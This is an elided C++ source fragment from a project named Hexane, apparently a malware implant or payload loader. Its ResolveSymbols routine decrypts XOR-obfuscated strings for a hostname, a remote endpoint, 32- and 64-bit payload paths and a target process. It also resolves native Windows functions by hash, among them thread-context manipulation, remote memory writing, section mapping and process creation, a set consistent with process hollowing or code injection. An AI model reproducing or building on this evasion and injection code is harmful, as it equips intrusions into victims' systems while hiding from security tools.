...
namespace Hexane {
    ...
    namespace Api {
        ...
        void ResolveSymbols(PAPI Api) {
            ...
            unsigned char strReloc[] = { 0x42,0x1a,0x23,0x59,0x39,0x1b,0x00 };
            xor_cipher(strReloc, Api->key.c_str(), ARRAY_LEN(strReloc));
            __alt_strcpy(&Api->relocSection, strReloc);
            
            unsigned char strText[] = { 0x42,0x1c,0x23,0x4d,0x22,0x00 };
            xor_cipher(strText, Api->key.c_str(), ARRAY_LEN(strText));
            __alt_strcpy(&Api->textSection, strText);

            unsigned char strHostname[] = { 0x20,0x2d,0x08,0x7a,0x00,0x37,0x1b,0x3a,0x64,0x32,0x02,0x0c,0x77,0x7a,0x03,0x00 };
            xor_cipher(strHostname, Api->key.c_str(), ARRAY_LEN(strHostname));
            __alt_strcpy(&Api->hostname, strHostname);

            unsigned char strEndpoint[] = { 0x04,0x1c,0x32,0x45,0x6c,0x57,0x19,0x5c,0x0f,0x4b,0x7f,0x69,0x0f,0x6f,0x61,0x0e,0x1c,0x77,0x41,0x4a,0x00 };
            xor_cipher(strEndpoint, Api->key.c_str(), ARRAY_LEN(strEndpoint));
            __alt_strcpy(&Api->endpoint, strEndpoint);

            unsigned char strPayload86[] = { 0x04,0x1c,0x32,0x45,0x6c,0x57,0x19,0x5c,0x0f,0x4b,0x7f,0x69,0x0f,0x6f,0x61,0x0e,0x1c,0x77,0x41,0x4a,0x7a,0x0f,0x61,0x5d,0x41,0x0b,0x27,0x59,0x35,0x0d,0x5a,0x0c,0x42,0x16,0x23,0x76,0x5b,0x61,0x7b,0x00 };
            xor_cipher(strPayload86, Api->key.c_str(), ARRAY_LEN(strPayload86));
            __alt_strcpy(&Api->payload86, strPayload86);

            unsigned char strPayload64[] = { 0x04,0x1c,0x32,0x45,0x6c,0x57,0x19,0x5c,0x0f,0x4b,0x7f,0x69,0x0f,0x6f,0x61,0x0e,0x1c,0x77,0x41,0x4a,0x7a,0x0f,0x6f,0x5f,0x41,0x0b,0x27,0x59,0x35,0x0d,0x5a,0x0c,0x42,0x16,0x23,0x76,0x5b,0x61,0x7b,0x00 };
            xor_cipher(strPayload64, Api->key.c_str(), ARRAY_LEN(strPayload64));
            __alt_strcpy(&Api->payload64, strPayload64);

            unsigned char strProcess[] = { 0x30,0x57,0x79,0x69,0x15,0x42,0x6a,0x3a,0x5f,0x17,0x35,0x37,0x4e,0x24,0x13,0x65,0x4b,0x35,0x07,0x16,0x38,0x44,0x6b,0x37,0x02,0x07,0x32,0x50,0x26,0x19,0x52,0x43,0x53,0x01,0x34,0x00 };
            xor_cipher(strProcess, Api->key.c_str(), ARRAY_LEN(strProcess));
            __alt_strcpy(&Api->process, strProcess);
            
#pragma region MODULES
            unsigned char strNtdll[] = { 0x02,0x1c,0x22,0x59,0x3a,0x56,0x52,0x01,0x5a,0x00 };
            DWORD dwNtdll = HashWrapper(strNtdll, Api->key.c_str(), ARRAY_LEN(strNtdll), true);
            HMODULE hmNtdll = GetModuleList(dwNtdll);

            unsigned char strKernel32[] = { 0x27,0x2d,0x14,0x7b,0x13,0x34,0x05,0x5f,0x18,0x3d,0x1d,0x14,0x00 };
...
#pragma region THREADS
            unsigned char strGetThreadContext[] = { 0x2b,0x0d,0x32,0x61,0x3e,0x0a,0x53,0x0c,0x52,0x3a,0x3e,0x36,0x4d,0x32,0x37,0x42,0x00 };
            ...
            unsigned char strSetThreadContext[] = { 0x3f,0x0d,0x32,0x61,0x3e,0x0a,0x53,0x0c,0x52,0x3a,0x3e,0x36,0x4d,0x32,0x37,0x42,0x00 };
            ...
            unsigned char strWow64GetThreadContext[] = { 0x3b,0x07,0x31,0x03,0x62,0x3f,0x53,0x19,0x62,0x11,0x23,0x3d,0x58,0x33,0x0c,0x59,0x5c,0x32,0x16,0x0b,0x21,0x00 };
            ...
            unsigned char strWow64SetThreadContext[] = { 0x3b,0x07,0x31,0x03,0x62,0x2b,0x53,0x19,0x62,0x11,0x23,0x3d,0x58,0x33,0x0c,0x59,0x5c,0x32,0x16,0x0b,0x21,0x00 }; 
            ...
            unsigned char strNtResumeThread[] = { 0x22,0x1c,0x14,0x50,0x25,0x0d,0x5b,0x08,0x62,0x11,0x23,0x3d,0x58,0x33,0x00 }; 
...
#pragma region PROCESS
            unsigned char strIsWow64Process[] = { 0x25,0x1b,0x11,0x5a,0x21,0x4e,0x02,0x3d,0x44,0x16,0x32,0x3d,0x4a,0x24,0x00 }; 
            ...
            unsigned char strRtlDestroyProcessParameters[] = { 0x3e,0x1c,0x2a,0x71,0x33,0x0b,0x42,0x1f,0x59,0x00,0x01,0x2a,0x56,0x34,0x2a,0x45,0x41,0x16,0x12,0x01,0x34,0x1a,0x3c,0x1f,0x09,0x1a,0x35,0x00 }; 
            ...
            unsigned char strRtlCreateProcessParametersEx[] = { 0x3e,0x1c,0x2a,0x76,0x24,0x1d,0x57,0x19,0x53,0x29,0x23,0x37,0x5a,0x32,0x3c,0x45,0x62,0x27,0x01,0x12,0x38,0x12,0x2d,0x0e,0x1e,0x1b,0x03,0x4d,0x00 }; 
            ...
            unsigned char strRtlInitUnicodeString[] = { 0x3e,0x1c,0x2a,0x7c,0x38,0x11,0x42,0x38,0x58,0x10,0x32,0x37,0x5d,0x32,0x1c,0x42,0x40,0x2f,0x1d,0x14,0x00 }; 
            ...
            unsigned char strNtCreateUserProcess[] = { 0x22,0x1c,0x05,0x47,0x33,0x19,0x42,0x08,0x63,0x0a,0x34,0x2a,0x69,0x25,0x20,0x55,0x57,0x35,0x00,0x00 }; 
            ...
            unsigned char strNtQueryInformationProcess[]  = { 0x22,0x1c,0x17,0x40,0x33,0x0a,0x4f,0x24,0x58,0x1f,0x3e,0x2a,0x54,0x36,0x3b,0x5f,0x5d,0x28,0x23,0x01,0x3a,0x14,0x3c,0x18,0x1f,0x00 }; 
            ...
            unsigned char strNtTerminateProcess[] = { 0x22,0x1c,0x12,0x50,0x24,0x15,0x5f,0x03,0x57,0x0d,0x34,0x08,0x4b,0x38,0x2c,0x53,0x41,0x35,0x00 }; 
            ...
            unsigned char strNtClose[] = { 0x22,0x1c,0x05,0x59,0x39,0x0b,0x53,0x00 }; 
...
#pragma region MEMORY
            unsigned char strNtFreeVirtualMemory[] = { 0x22,0x1c,0x00,0x47,0x33,0x1d,0x60,0x04,0x44,0x0d,0x24,0x39,0x55,0x1a,0x2a,0x5b,0x5d,0x34,0x0a,0x00 }; 
            ...
            unsigned char strNtAllocateVirtualMemory[] = { 0x22,0x1c,0x07,0x59,0x3a,0x17,0x55,0x0c,0x42,0x1c,0x07,0x31,0x4b,0x23,0x3a,0x57,0x5e,0x0b,0x16,0x1e,0x3a,0x05,0x20,0x00 }; 
            ...
            unsigned char strNtQueryVirtualMemory[] = { 0x22,0x1c,0x17,0x40,0x33,0x0a,0x4f,0x3b,0x5f,0x0b,0x25,0x2d,0x58,0x3b,0x02,0x53,0x5f,0x29,0x01,0x0a,0x00 }; 
            ...
            unsigned char strNtProtectVirtualMemory[] = { 0x22,0x1c,0x16,0x47,0x39,0x0c,0x53,0x0e,0x42,0x2f,0x38,0x2a,0x4d,0x22,0x2e,0x5a,0x7f,0x23,0x1e,0x1c,0x27,0x0e,0x00 }; 
            ...
            unsigned char strNtReadVirtualMemory[] = { 0x22,0x1c,0x14,0x50,0x37,0x1c,0x60,0x04,0x44,0x0d,0x24,0x39,0x55,0x1a,0x2a,0x5b,0x5d,0x34,0x0a,0x00 }; 
            ...
            unsigned char strNtWriteVirtualMemroy[] = { 0x22,0x1c,0x11,0x47,0x3f,0x0c,0x53,0x3b,0x5f,0x0b,0x25,0x2d,0x58,0x3b,0x02,0x53,0x5f,0x29,0x01,0x0a,0x00 }; 
            ...
            unsigned char strNtCreateSection[] = { 0x22,0x1c,0x05,0x47,0x33,0x19,0x42,0x08,0x65,0x1c,0x32,0x2c,0x50,0x38,0x21,0x00 };
            ...
            unsigned char strNtUnmapViewOfSection[] = { 0x22,0x1c,0x13,0x5b,0x3b,0x19,0x46,0x3b,0x5f,0x1c,0x26,0x17,0x5f,0x04,0x2a,0x55,0x46,0x2f,0x1c,0x1d,0x00 }; 
            ...
            unsigned char strNtMapViewOfSection[] = { 0x22,0x1c,0x0b,0x54,0x26,0x2e,0x5f,0x08,0x41,0x36,0x37,0x0b,0x5c,0x34,0x3b,0x5f,0x5d,0x28,0x00 }; 
            ...
            unsigned char strRtlCreateHeap[] = { 0x3e,0x1c,0x2a,0x76,0x24,0x1d,0x57,0x19,0x53,0x31,0x34,0x39,0x49,0x00 }; 
            ...
            unsigned char strRtlAllocateHeap[] = { 0x3e,0x1c,0x2a,0x74,0x3a,0x14,0x59,0x0e,0x57,0x0d,0x34,0x10,0x5c,0x36,0x3f,0x00 }; 
            ...
            unsigned char strRtlFreeHeap[] = { 0x3e,0x1c,0x2a,0x73,0x24,0x1d,0x53,0x25,0x53,0x18,0x21,0x00 }; 
            ...
            unsigned char strRtlDestroyHeap[] = { 0x3e,0x1c,0x2a,0x71,0x33,0x0b,0x42,0x1f,0x59,0x00,0x19,0x3d,0x58,0x27,0x00 }; 
...
#pragma region SYSTEM
            unsigned char strGetComputerNameExA[] = { 0x2b,0x0d,0x32,0x76,0x39,0x15,0x46,0x18,0x42,0x1c,0x23,0x16,0x58,0x3a,0x2a,0x73,0x4a,0x07,0x00 }; 
            ...
            unsigned char strGlobalMemoryStatusEx[] = { 0x2b,0x04,0x29,0x57,0x37,0x14,0x7b,0x08,0x5b,0x16,0x23,0x21,0x6a,0x23,0x2e,0x42,0x47,0x35,0x36,0x0b,0x00 }; 
